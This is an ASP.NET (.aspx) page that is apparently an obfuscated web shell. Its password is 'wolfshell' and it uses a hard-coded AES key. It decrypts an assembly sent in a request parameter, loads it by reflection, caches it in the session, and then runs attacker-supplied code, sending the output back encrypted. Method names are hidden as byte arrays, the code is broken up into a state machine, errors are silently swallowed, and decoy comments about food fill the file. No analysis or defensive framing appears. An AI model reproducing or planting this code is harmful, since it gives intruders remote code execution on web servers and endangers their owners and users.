<%@ Page Language="C#"%><%
// 배고파요, 치킨 먹고 싶다.
try {
    int state_0 = 0;
    string v_key_str = null; string v_pass_str = null; string v_md5_str = null; byte[] v_data_bytes = null; string v_sess_key = null; object v_sess_val = null; System.IO.MemoryStream v_ms = null; object v_inst = null; byte[] v_resp_bytes = null;
    while(state_0 != -1) {
        switch(state_0) {
            case 0: // 초기화 단계
                v_key_str = "3c6e0b8a9c15224a";
                v_pass_str = "wolfshell";
                state_0 = 1;
                break;
            case 1: // MD5 계산
                v_md5_str = System.BitConverter.ToString(new System.Security.Cryptography.MD5CryptoServiceProvider().ComputeHash(System.Text.Encoding.Default.GetBytes(v_pass_str + v_key_str))).Replace("-", "");
                state_0 = 2;
                break;
            case 2: // 요청 데이터 읽기
                v_data_bytes = System.Convert.FromBase64String(Context.Request[v_pass_str]);
                state_0 = 3;
                break;
            case 3: // 데이터 복호화
                using(var rij_1 = new System.Security.Cryptography.RijndaelManaged()){
                    var key_b = System.Text.Encoding.Default.GetBytes(v_key_str);
                    v_data_bytes = rij_1.CreateDecryptor(key_b, key_b).TransformFinalBlock(v_data_bytes, 0, v_data_bytes.Length);
                }
                state_0 = 4;
                break;
            case 4: // 세션 확인
                v_sess_key = System.Text.Encoding.ASCII.GetString(new byte[]{112,97,121,108,111,97,100});
                v_sess_val = Context.Session[v_sess_key];
                state_0 = (v_sess_val == null) ? 5 : 6;
                break;
            case 5: // 어셈블리 로드
                var asm_t = typeof(System.Reflection.Assembly);
                var load_m = asm_t.GetMethod(System.Text.Encoding.ASCII.GetString(new byte[]{76,111,97,100}), new System.Type[]{typeof(byte[])});
                Context.Session[v_sess_key] = load_m.Invoke(null, new object[]{v_data_bytes});
                state_0 = -1; // 처리 종료
                break;
            case 6: // 인스턴스 생성
                v_ms = new System.IO.MemoryStream();
                v_inst = ((System.Reflection.Assembly)v_sess_val).CreateInstance(System.Text.Encoding.ASCII.GetString(new byte[]{76,89}));
                state_0 = 7;
                break;
            case 7: // 메소드 호출
                v_inst.Equals(Context);
                v_inst.Equals(v_ms);
                v_inst.Equals(v_data_bytes);
                v_inst.ToString(); // 오늘 저녁은 뭐 먹지?
                state_0 = 8;
                break;
            case 8: // 응답 준비
                v_resp_bytes = v_ms.ToArray();
                state_0 = 9;
                break;
            case 9: // 응답 암호화
                using(var rij_2 = new System.Security.Cryptography.RijndaelManaged()){
                    var key_b2 = System.Text.Encoding.Default.GetBytes(v_key_str);
                    var enc_b = rij_2.CreateEncryptor(key_b2, key_b2).TransformFinalBlock(v_resp_bytes, 0, v_resp_bytes.Length);
                    Context.Response.Write(v_md5_str.Substring(0,16));
                    Context.Response.Write(System.Convert.ToBase64String(enc_b));
                    Context.Response.Write(v_md5_str.Substring(16));
                }
                state_0 = -1; // 모든 작업 완료
                break;
        }
    }
} catch (System.Exception ex) {
    // 이 오류는 무시됩니다.
}
%>